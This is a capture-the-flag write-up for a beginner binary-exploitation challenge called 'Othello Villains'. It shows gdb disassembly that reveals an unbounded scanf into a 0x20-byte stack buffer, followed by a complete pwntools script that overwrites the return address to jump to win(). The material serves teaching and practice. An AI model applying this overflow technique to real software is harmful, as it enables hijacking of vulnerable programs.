# Othello Villains

```text
The Othello villains stole our sacred Brunner recipe! Luckily, they are unable to write secure code, please retrieve the recipe from their (in)secure vault!
```

points: `100`

solves: `286`

author: `olexmeister`

---
This challenge is similar to [Dat Overflow Dough](../Shake%20&%20Bake%20(Beginner)/Dat%20Overflow%20Dough.md), except the source code is not given

```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  puts@plt
0x00000000004010b0  fread@plt
0x00000000004010c0  fflush@plt
0x00000000004010d0  setvbuf@plt
0x00000000004010e0  fopen@plt
0x00000000004010f0  __isoc99_scanf@plt
0x0000000000401100  exit@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  init
0x000000000040125b  main
0x00000000004012ae  win
0x0000000000401330  _fini
```

`win()` at **0x00000000004012ae**

```text
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040125b <+0>: endbr64
   0x000000000040125f <+4>: push   rbp
   0x0000000000401260 <+5>: mov    rbp,rsp
   0x0000000000401263 <+8>: sub    rsp,0x30
   0x0000000000401267 <+12>:    mov    DWORD PTR [rbp-0x24],edi
   0x000000000040126a <+15>:    mov    QWORD PTR [rbp-0x30],rsi
   0x000000000040126e <+19>:    lea    rax,[rip+0xd93]        # 0x402008
   0x0000000000401275 <+26>:    mov    rdi,rax
   0x0000000000401278 <+29>:    call   0x4010a0 <puts@plt>
   0x000000000040127d <+34>:    mov    rax,QWORD PTR [rip+0x2ddc]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x0000000000401284 <+41>:    mov    rdi,rax
   0x0000000000401287 <+44>:    call   0x4010c0 <fflush@plt>
   0x000000000040128c <+49>:    lea    rax,[rbp-0x20]
   0x0000000000401290 <+53>:    mov    rsi,rax
   0x0000000000401293 <+56>:    lea    rax,[rip+0xdaa]        # 0x402044
   0x000000000040129a <+63>:    mov    rdi,rax
   0x000000000040129d <+66>:    mov    eax,0x0
   0x00000000004012a2 <+71>:    call   0x4010f0 <__isoc99_scanf@plt>
   0x00000000004012a7 <+76>:    mov    eax,0x0
   0x00000000004012ac <+81>:    leave
   0x00000000004012ad <+82>:    ret
```

Buffer of length **0x20**

```python
from pwn import *

RECIPE_BUFFER_SIZE = 0x20
RBP_SIZE = 0x8
SECRET_ADDRESS = 0x00000000004012ae
PROMPT = ""

USE_REMOTE = False
REMOTE_HOST = ""
REMOTE_PORT = 0

if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./othelloserver")
    io = e.process()

payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```
